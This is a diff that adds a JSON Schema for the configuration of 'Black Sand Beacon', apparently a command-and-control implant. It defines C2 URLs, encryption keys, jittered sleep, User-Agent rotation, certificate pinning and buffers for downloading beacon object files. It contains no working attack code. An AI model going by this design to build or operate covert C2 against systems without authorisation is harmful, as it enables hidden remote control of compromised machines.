@@ -1,0 +1,192 @@
+{
+  "$schema": "http://json-schema.org/draft-07/schema#",
+  "title": "Black Sand Beacon Configuration Schema",
+  "type": "object",
+  "additionalProperties": false,
+  "required": ["c2", "crypto", "timing", "network", "bof", "backoff"],
+  "properties": {
+    "c2": {
+      "type": "object",
+      "additionalProperties": false,
+      "required": ["url", "uri", "client_id", "report_uri"],
+      "properties": {
+        "url": {
+          "type": "string",
+          "format": "uri",
+          "description": "C2 base URL"
+        },
+        "uri": {
+          "type": "string",
+          "pattern": "^/.*/$",
+          "description": "URI path before client ID"
+        },
+        "client_id": {
+          "type": "string",
+          "maxLength": 64,
+          "description": "Beacon identifier"
+        },
+        "report_uri": {
+          "type": "string",
+          "pattern": "^/.*/$",
+          "description": "URI path for reporting results"
+        },
+        "port": {
+          "type": "integer",
+          "minimum": 1,
+          "maximum": 65535,
+          "description": "C2 server port"
+        },
+        "log_dir": {
+          "type": "string",
+          "description": "Directory for log files"
+        },
+        "upload_dir": {
+          "type": "string",
+          "description": "Directory for BOF uploads"
+        }
+      }
+    },
+    "crypto": {
+      "type": "object",
+      "additionalProperties": false,
+      "required": ["mode"],
+      "properties": {
+        "aes_key_hex": {
+          "type": "string",
+          "pattern": "^([0-9a-fA-F]{64})?$",
+          "description": "Legacy raw AES key (64 hex chars). Used for backward compat if master_key_hex not provided."
+        },
+        "master_key_hex": {
+          "type": "string",
+          "pattern": "^([0-9a-fA-F]{64})?$",
+          "description": "Master secret for HKDF key derivation (64 hex chars = 32 bytes)"
+        },
+        "mode": {
+          "type": "string",
+          "enum": ["cfb", "gcm"],
+          "description": "Encryption mode"
+        },
+        "replay_window_seconds": {
+          "type": "integer",
+          "minimum": 1,
+          "maximum": 86400,
+          "default": 300,
+          "description": "Replay protection time window in seconds"
+        }
+      }
+    },
+    "timing": {
+      "type": "object",
+      "additionalProperties": false,
+      "required": ["sleep_seconds", "jitter_percent", "curl_timeout_seconds", "curl_connect_timeout_seconds"],
+      "properties": {
+        "sleep_seconds": {
+          "type": "integer",
+          "minimum": 1,
+          "maximum": 86400,
+          "description": "Base poll interval in seconds"
+        },
+        "jitter_percent": {
+          "type": "integer",
+          "minimum": 0,
+          "maximum": 100,
+          "description": "Jitter percentage applied to sleep interval"
+        },
+        "curl_timeout_seconds": {
+          "type": "integer",
+          "minimum": 1,
+          "maximum": 300,
+          "description": "Total curl timeout in seconds"
+        },
+        "curl_connect_timeout_seconds": {
+          "type": "integer",
+          "minimum": 1,
+          "maximum": 60,
+          "description": "Curl connection timeout in seconds"
+        }
+      }
+    },
+    "network": {
+      "type": "object",
+      "additionalProperties": false,
+      "required": ["user_agents", "verify_tls", "cert_fingerprint_sha256"],
+      "properties": {
+        "user_agents": {
+          "type": "array",
+          "items": {
+            "type": "string",
+            "maxLength": 256
+          },
+          "minItems": 1,
+          "maxItems": 16,
+          "description": "List of User-Agent strings for rotation"
+        },
+        "verify_tls": {
+          "type": "boolean",
+          "description": "Whether to verify TLS certificates"
+        },
+        "cert_fingerprint_sha256": {
+          "type": "string",
+          "pattern": "^([0-9a-fA-F]{64})?$",
+          "description": "Certificate fingerprint for pinning (64 hex chars). Empty = TOFU mode."
+        }
+      }
+    },
+    "bof": {
+      "type": "object",
+      "additionalProperties": false,
+      "required": ["download_chunk_size", "output_buffer_size"],
+      "properties": {
+        "download_chunk_size": {
+          "type": "integer",
+          "minimum": 512,
+          "maximum": 65536,
+          "description": "BOF download buffer size in bytes"
+        },
+        "output_buffer_size": {
+          "type": "integer",
+          "minimum": 4096,
+          "maximum": 1048576,
+          "description": "BOF output buffer size in bytes"
+        }
+      }
+    },
+    "backoff": {
+      "type": "object",
+      "additionalProperties": false,
+      "required": ["base_seconds", "max_seconds"],
+      "properties": {
+        "base_seconds": {
+          "type": "integer",
+          "minimum": 1,
+          "maximum": 300,
+          "description": "Initial backoff sleep on failure"
+        },
+        "max_seconds": {
+          "type": "integer",
+          "minimum": 1,
+          "maximum": 3600,
+          "description": "Maximum backoff sleep cap"
+        }
+      }
+    },
+    "server": {
+      "type": "object",
+      "additionalProperties": false,
+      "properties": {
+        "max_workers": {
+          "type": "integer",
+          "minimum": 1,
+          "maximum": 100,
+          "default": 10,
+          "description": "C2 server thread pool size"
+        },
+        "hmac_enabled": {
+          "type": "boolean",
+          "default": false,
+          "description": "Enable HMAC authentication"
+        }
+      }
+    }
+  }
+}
